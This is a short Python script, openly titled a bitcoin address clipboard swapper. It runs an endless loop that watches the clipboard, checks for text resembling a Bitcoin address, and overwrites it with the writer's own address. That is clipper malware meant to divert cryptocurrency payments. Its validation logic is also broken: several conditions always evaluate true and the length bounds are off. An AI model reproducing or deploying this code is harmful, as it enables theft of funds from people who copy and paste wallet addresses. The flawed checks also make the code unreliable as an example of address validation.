# bitcoin address clipboard swapper

# bitcoin address validation:
# they are 26-35 alphanumeric characters
# they begin with '1' or '3' or 'bc1'
# the do not contain uppercase 'O', number '0', lowercase 'l' and uppercase 'I'

import clipboard

def get_clipboard():
    # store clipboard value
    data = str(clipboard.paste())
    
    # validate bitcoin address
    if 26 < len(data) < 35:
        if (data[0] == '1' or '3' or 'bc1'):   
            for i in str(data):
                if (i == ('O' or '0' or 'I' or 'l')):
                    break;
                else:
                     # swap address
                    swap_address(str(data))
    
#set clipoboard data
def swap_address(data):
    clipboard.copy("my_bitcoin_address")


while True:
    get_clipboard()
    
